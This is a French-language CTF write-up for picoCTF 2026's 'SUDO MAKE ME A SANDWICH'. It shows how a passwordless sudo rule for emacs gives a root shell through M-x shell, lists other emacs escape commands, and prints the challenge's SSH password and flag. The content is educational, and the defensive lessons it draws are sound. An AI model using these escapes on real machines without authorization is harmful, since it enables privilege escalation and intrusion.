# picoCTF 2026 - SUDO MAKE ME A SANDWICH

| Champ | Détail |
|---|---|
| **Catégorie** | General Skills |
| **Difficulté** | Easy |
| **Auteur** | DARKRAICG492 |

---

## Description

> Can you read the flag? I think you can!

On se connecte à une machine via SSH. Un fichier `flag.txt` est présent mais appartient à `root` et n'est lisible que par lui. L'objectif : trouver un moyen d'élever nos privilèges pour lire ce fichier.

---

## Connexion

```bash
ssh -p 63515 ctf-player@green-hill.picoctf.net
# password: 8b23dc85
```

---

## Analyse & Raisonnement

### Observation initiale

En listant les fichiers du répertoire courant :

```bash
ctf-player@challenge:~$ ls -l
total 4
-r--r----- 1 root root 31 Mar  9 21:32 flag.txt
```

Le fichier `flag.txt` appartient à `root` avec les permissions `r--r-----` (lecture pour root et son groupe uniquement). Notre utilisateur `ctf-player` n'y a pas accès directement.

### Vérification des droits sudo

La commande `sudo -l` permet de lister les commandes qu'un utilisateur peut exécuter avec des privilèges élevés :

```bash
ctf-player@challenge:~$ sudo -l
```

**Résultat :**
```
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=...

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```

`ctf-player` peut exécuter `/bin/emacs` en tant que **n'importe quel utilisateur** (`ALL`), **sans mot de passe** (`NOPASSWD`). C'est notre vecteur d'attaque.

---

## Exploitation — Sudo + Emacs Shell Escape

### La technique : Shell Escape depuis Emacs

Emacs est un éditeur de texte qui embarque un interpréteur Lisp complet et peut lancer un shell interactif depuis l'intérieur. Si on lance Emacs avec `sudo`, ce shell tourne avec les droits **root**.

### Étape 1 : Lancer Emacs en root

```bash
ctf-player@challenge:~$ sudo emacs
```

Emacs s'ouvre avec les privilèges root.

### Étape 2 : Ouvrir un shell depuis Emacs

Dans l'interface Emacs, on utilise le raccourci :

```
Alt + X
```

Puis dans la minibuffer (la barre en bas), on tape :

```
shell
```

Et on valide avec `Entrée`. Emacs ouvre un terminal shell — qui tourne en tant que **root**.

### Étape 3 : Lire le flag

```bash
root@challenge:/home/ctf-player# cat flag.txt
picoCTF{ju57_5ud0_17_9a782247}
```

---

## Flag

```
picoCTF{ju57_5ud0_17_9a782247}
```

---

## Explication technique — Pourquoi c'est dangereux ?

Cette vulnérabilité illustre le concept de **GTFOBins** : une collection de binaires Unix légitimes qui peuvent être détournés pour contourner des restrictions de sécurité, notamment les configurations `sudo` mal pensées.

> 🔗 Référence : [gtfobins.github.io/gtfobins/emacs](https://gtfobins.github.io/gtfobins/emacs/)

La règle sudo ici est trop permissive :

```
(ALL) NOPASSWD: /bin/emacs
```

Elle signifie : *"ctf-player peut lancer emacs en tant que root, sans fournir de mot de passe"*. Mais emacs, comme de nombreux éditeurs riches (vim, nano avec certaines options, less, man...), permet d'exécuter des commandes shell depuis l'intérieur — ce qui offre une **élévation de privilèges complète**.

### Autres méthodes d'escape depuis Emacs

| Méthode | Commande dans Emacs |
|---|---|
| Shell interactif | `M-x shell` |
| Exécuter une commande unique | `M-x shell-command` puis `cat flag.txt` |
| Eval Lisp | `M-x eval-expression` puis `(shell-command "cat flag.txt")` |
| Ouvrir un fichier directement | `C-x C-f /home/ctf-player/flag.txt` |


## Ce que j'ai appris

- **Toujours vérifier `sudo -l`** en début d'énumération : c'est souvent le chemin le plus court vers une élévation de privilèges.
- Les **éditeurs de texte avancés** (emacs, vim, nano) sont des vecteurs d'escalade connus dès qu'ils sont accessibles via sudo - ils permettent d'exécuter des commandes shell sans quitter l'éditeur.
- Le principe du **moindre privilège** est fondamental : ne jamais donner accès à un binaire complet quand seule une fonctionnalité précise est nécessaire.
- **GTFOBins** est une ressource incontournable en pentest pour identifier les binaires exploitables.

---

*Writeup par [TidiX](https://github.com/Tidjene) - TidiX.Cyber*
